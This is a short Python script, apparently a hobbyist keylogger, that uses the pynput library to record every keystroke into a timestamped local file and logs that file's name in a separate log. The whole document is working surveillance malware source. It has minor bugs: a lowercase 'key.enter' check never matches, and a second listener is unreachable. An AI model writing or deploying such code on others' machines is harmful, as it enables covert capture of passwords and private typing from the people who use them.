from pynput import keyboard
from datetime import datetime


now = datetime.now()
now = (now.strftime("%Y-%m-%d %H:%M"))

with open("logger_result.txt" , "a") as file:
    file.write(f"key loger file at {now} is named {now}_Keylogger_data \n")

with open(f"{now}_Keylogger_data" , "w") as file:
    file.write(" ")


def pressed(key):
    try:
        key_pressed = format(key.char)
        with open(f"{now}_Keylogger_data" , "a") as file:

            file.write(f'{key_pressed}')

    except:
        key_pressed = format(key)
        with open(f"{now}_Keylogger_data", "a") as file:
            if key_pressed == "key.enter":
                file.write('\n ')
            if key_pressed == "Key.space":
                file.write(" ")

with keyboard.Listener(
    on_press=pressed) as listner:
    listner.join()

listener = keyboard.Listener(
    on_press=pressed)
listener.start()